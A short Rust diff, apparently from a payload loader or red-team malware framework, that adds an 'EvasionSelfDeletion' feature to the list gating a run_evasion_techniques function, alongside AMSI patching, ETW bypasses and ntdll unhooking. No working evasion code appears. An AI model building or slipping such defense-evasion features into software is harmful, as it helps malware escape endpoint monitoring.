@@ -29,7 +29,7 @@ mod args;
 const ENCPAYLOAD: &[u8] = &[];
 
 /// Run all enabled evasion techniques
-#[cfg(any(feature = "EvasionAMSISimplePatch", feature = "EvasionETWSimple", feature = "EvasionNtdllUnhooking", feature = "EvasionAMSIHwbp", feature = "EvasionETWWinAPI", feature = "EvasionETWpEventWrite", feature = "EvasionETWpEventWrite2"))]
+#[cfg(any(feature = "EvasionAMSISimplePatch", feature = "EvasionETWSimple", feature = "EvasionNtdllUnhooking", feature = "EvasionAMSIHwbp", feature = "EvasionSelfDeletion", feature = "EvasionETWWinAPI", feature = "EvasionETWpEventWrite", feature = "EvasionETWpEventWrite2"))]
 fn run_evasion_techniques() {
     #[cfg(feature = "EvasionNtdllUnhooking")]
     {
